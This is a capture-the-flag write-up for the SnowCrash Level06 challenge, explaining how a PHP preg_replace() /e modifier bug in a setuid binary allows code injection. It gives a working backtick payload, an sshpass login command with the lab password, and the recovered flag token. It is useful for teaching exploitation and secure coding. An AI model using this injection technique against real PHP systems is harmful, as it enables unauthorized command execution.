# Level06 Solution

## Starting VM

```bash
qemu-system-x86_64 -m 2048 -cdrom ./SnowCrash.iso -boot d -net nic,model=virtio -net user,hostfwd=tcp::4242-:4242
```

## Objective
Exploit a PHP preg_replace() /e modifier vulnerability to retrieve the flag06 token.

## Vulnerability
PHP preg_replace() /e modifier allows arbitrary code execution via unsanitized regex replacement.

## Exploitation

The `/e` modifier (deprecated in PHP 5.5, removed in 7.0) causes the replacement string to be evaluated as PHP code:

```php
function y($m) {
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}
function x($y, $z) {
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);  // /e modifier!
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}
$r = x($argv[1], $argv[2]); print $r;
```

**The Vulnerability:**
- The `/e` modifier causes the replacement string to be eval()'d as PHP
- Input from the file is not sanitized
- Backticks in PHP can execute shell commands
- The binary runs with flag06 privileges (setuid)

### Exploit Steps

#### Step 1: Create PHP Injection Payload
The payload uses backticks inside the /e modifier context:

```bash
printf '[x ${`getflag`}]\n' > /tmp/level06_exploit.txt
```

**Payload Breakdown:**
- `[x ...]` - Matches the regex pattern `/(\[x (.*)\])/e`
- `${...}` - PHP variable interpolation syntax
- `` `getflag` `` - Backticks execute shell command within PHP
- The captured group is passed to `y()` function
- Function y() processes the output (replaces dots with " x ")

#### Step 2: Execute Exploit via Setuid Binary and Capture Output
Use the token from Level05 as the password:

```bash
sshpass -p "viuaaale9huek52boumoomioc" ssh -o StrictHostKeyChecking=no -p 4242 level06@localhost << 'EXPLOIT'
printf '[x ${`getflag`}]\n' > /tmp/level06_exploit.txt
./level06 /tmp/level06_exploit.txt 2>&1 | tee /tmp/level06_output.txt
cat /tmp/level06_output.txt
EXPLOIT
```

**Execution Flow:** Binary reads payload > Regex matches and captures `${`getflag`}` > PHP eval executes with backticks > `getflag` runs with flag06 privileges > Output is processed by y() and printed.

#### Step 3: Extract Token from Output
The output contains the flag token wrapped in the function's processing:

```bash
./level06 /tmp/level06_exploit.txt 2>&1 | grep "Check flag"
```

Output:
```
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

**Note:** The y() function transforms dots to " x " in the output, so the token may appear with spacing modifications in the function's output processing.

## Security Flaws

1. **Deprecated /e modifier**: eval() on replacement strings in PHP
2. **No input validation**: User file content used in regex without sanitization
3. **Backtick execution**: Shell commands execute in eval context
4. **Setuid amplification**: Binary runs with flag06 privileges
5. **No output escaping**: Processed output still contains sensitive data
6. **Unsafe pattern matching**: Regex captures and evals untrusted data

## Answer

- **Level06 Token**: `wiok45aaoguiboiki2tuin6ub`
- **Vulnerability Type**: PHP /e modifier code injection with backtick execution
- **Impact**: Remote code execution with arbitrary command execution via backticks in eval context
